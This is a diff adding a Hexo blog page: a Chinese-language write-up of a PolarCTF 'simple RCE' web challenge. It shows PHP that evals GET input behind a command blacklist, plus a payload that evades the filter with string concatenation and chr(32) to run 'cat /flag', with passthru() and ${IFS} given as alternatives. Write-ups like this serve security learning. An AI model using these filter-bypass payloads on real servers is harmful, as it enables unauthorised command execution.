@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>y@7q | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">y@7q</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            polarctf复现
+        </div>
+        <div class="post-meta">
+            2025-03-22
+        </div>
+        <div class="post-md">
+            <span id="more"></span>
+<h1 id="web部分"><a href="#web部分" class="headerlink" title="web部分"></a>web部分</h1><h2 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h2><h2 id="简单RCE"><a href="#简单RCE" class="headerlink" title="简单RCE"></a>简单RCE</h2><p>从GPT身上学到一种php中命令执行绕过思路，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;</span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>可以看到是黑名单过滤，通过<code>;</code>可以执行多语句命令，通过变量赋值以及调用即可完成绕过，空格可以用<code>chr(32)</code>代替，所有字符可以利用<code>.</code>来进行来来连接。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://032c9277-dd21-4a2e-9cc6-c3e6158ba6c8.www.polarctf.com:8090/?sys=$a=&quot;s&quot;.&quot;ystem&quot;;$b=&quot;ca&quot;.&quot;t&quot;.chr(32).&quot;/flag&quot;;$a($b);</span><br><span class="line"></span><br><span class="line">POST参数：yyds=666</span><br></pre></td></tr></table></figure>
+
+<p>还有一种思路：<strong>通过执行函数passthru()来替换system(), 空格就用${IFS}替代即可</strong></p>
+<p><img src="/polarctf%E6%80%BB%E7%BB%93/1742639840152.png" alt="1742639840152"></p>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 y@7q</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
